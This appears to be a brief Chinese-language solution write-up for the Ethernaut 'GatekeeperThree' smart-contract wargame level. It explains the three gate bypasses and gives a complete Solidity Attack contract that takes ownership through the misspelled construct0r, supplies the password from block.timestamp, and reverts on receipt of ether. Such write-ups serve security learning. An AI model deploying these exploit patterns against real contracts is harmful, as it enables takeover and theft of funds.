- `gateOne` 通过合约和调用 `construct0r` 实现
- `gateTwo` 只要在同一个交易里 `createTrick` 和 `getAllowance`，密码就是同一个 `block.timestamp`，可以直接获取
- `gateThree` 只要在 `receive` 函数中 `revert` 即可

```solidity
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external returns (bool entered);
}


contract Attack {
    function attack(address _level) public payable {
        IGatekeeperThree level = IGatekeeperThree(_level);
        level.construct0r();
        level.createTrick();
        level.getAllowance(block.timestamp);
        payable(address(level)).call{value: msg.value}("");
        level.enter();
    }

    receive() external payable {
        revert();
    }
}
```

